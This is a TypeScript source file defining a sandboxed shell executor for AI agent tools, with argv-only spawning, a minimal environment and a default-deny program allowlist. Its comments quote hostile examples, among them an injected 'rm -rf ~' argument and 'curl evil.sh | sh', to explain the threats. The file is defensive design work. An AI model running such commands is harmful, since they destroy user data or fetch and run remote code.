/**
 * The shell executor port — and the single most important security decision in
 * the whole tool layer.
 *
 * ## Argv, never a shell string
 *
 * A shell tool runs commands *chosen by a model*. The obvious implementation —
 * `exec("git " + userInput)` — is command injection with a bow on it: a model
 * (or a prompt-injected document a model is summarising) that produces
 * `main; rm -rf ~` gets exactly that run. There is no amount of escaping that
 * makes string concatenation into a shell safe, because the escaping rules are
 * the shell's and the shell is Turing-complete.
 *
 * So this port does not take a command *string*. It takes a program and an
 * **argv array**, and {@link NodeShellExecutor} spawns it with **no shell at
 * all**. `run('git', ['checkout', branch])` runs `git` with two arguments; there
 * is no parser between the argument and the process, so `branch` being
 * `; rm -rf ~` is a branch named `; rm -rf ~` that git rejects, not a second
 * command. Injection is not *mitigated* here — it is *unrepresentable*, because
 * there is no string for a shell to interpret.
 *
 * ## Everything else is a bound
 *
 * A command can hang, spew gigabytes, or fork. So every run is bounded: a
 * timeout, an output cap, a working directory, and cancellation. Those are the
 * executor's job because only the executor holds the process handle; the tools
 * above declare the limits, and the port enforces them.
 */

import { ShellError } from './errors.js';

export interface ShellRunOptions {
  /** Working directory. The executor's own default when unset. */
  readonly cwd?: string;
  /**
   * Environment variables.
   *
   * **Replaces** the ambient environment rather than extending it, and that is
   * deliberate: a subprocess that inherited the host's whole `process.env` would
   * inherit its secrets — `AWS_SECRET_ACCESS_KEY`, database URLs, API tokens — and
   * hand them to a command a model chose. A caller passes exactly what the
   * command needs, and nothing it does not.
   *
   * When unset, {@link NodeShellExecutor} defaults to a minimal `{ PATH }` — not
   * the host environment, and not nothing (which would make `PATH`-resolved
   * commands unfindable). See RFC-0008 §5.
   */
  readonly env?: Readonly<Record<string, string>>;
  /** Text piped to the command's stdin. */
  readonly stdin?: string;
  /** Kill the command after this long. The executor's default when unset. */
  readonly timeoutMs?: number;
  /** Kill the command if its combined output exceeds this. The default when unset. */
  readonly maxOutputBytes?: number;
  /** Cancels the run, killing the process. */
  readonly signal?: AbortSignal;
}

/**
 * What a finished command produced.
 *
 * A *result*, not a thrown error, even for a non-zero exit — because a command
 * failing is information an agent should reason about (a test suite that failed,
 * a file that did not exist), exactly as a failing tool is (RFC-0005 §5.4). The
 * executor throws only when it could not *run* the command at all: the program
 * was not found, or was not allowed.
 */
export interface ShellResult {
  readonly command: string;
  readonly args: readonly string[];
  /** The process exit code. `null` when the process was killed by a signal. */
  readonly exitCode: number | null;
  /** The signal that killed it, if any — `SIGTERM` from a timeout, `SIGKILL`, … */
  readonly signal: string | null;
  readonly stdout: string;
  readonly stderr: string;
  /** True when the timeout fired. `exitCode` is then `null`. */
  readonly timedOut: boolean;
  /** True when the output cap fired and the process was killed. */
  readonly truncated: boolean;
  /** Wall-clock duration in milliseconds. */
  readonly durationMs: number;
}

/**
 * Runs one command and reports what it did.
 *
 * The whole interface, and it is a program plus argv — never a string a shell
 * would interpret. `@throws {ShellError}` only when the command could not be run:
 * `NOT_ALLOWED`, `NOT_FOUND`. A command that ran and failed is a `ShellResult`
 * with a non-zero `exitCode`.
 */
export interface ShellExecutor {
  run(
    command: string,
    args: readonly string[],
    options?: ShellRunOptions,
  ): Promise<ShellResult>;
}

/**
 * Wrap an executor so only allow-listed programs can run.
 *
 * **A `shell:exec` permission is not enough.** "This agent may run commands" and
 * "this agent may run `git`, `ls`, and `cat`" are different grants, and the
 * second is the one a host actually wants — an agent that can run *any* program
 * can run `curl evil.sh | sh`, so the permission to run commands at all is only
 * safe alongside a list of *which*.
 *
 * The allowlist is matched on the **program name only**, never the arguments:
 * arguments are data (§argv above), and an allowlist that tried to police them
 * would be back in the business of interpreting a command line, which is the
 * thing this design refuses to do. A host that needs "git but not `git push`"
 * expresses it with a wrapper program, not an argument pattern.
 *
 * Default-deny: a program not on the list is refused with `NOT_ALLOWED` before it
 * is spawned. An empty allowlist runs nothing, which is the correct posture for a
 * context that has not decided what it trusts.
 */
export function allowlisted(
  inner: ShellExecutor,
  allowed: Iterable<string>,
): ShellExecutor {
  const permitted = new Set(allowed);

  return {
    run: async (command, args, options) => {
      if (!permitted.has(command)) {
        throw new ShellError(
          'NOT_ALLOWED',
          command,
          permitted.size === 0
            ? 'no commands are allowed in this context'
            : `only these commands are allowed: ${[...permitted].sort().join(', ')}`,
        );
      }
      return inner.run(command, args, options);
    },
  };
}
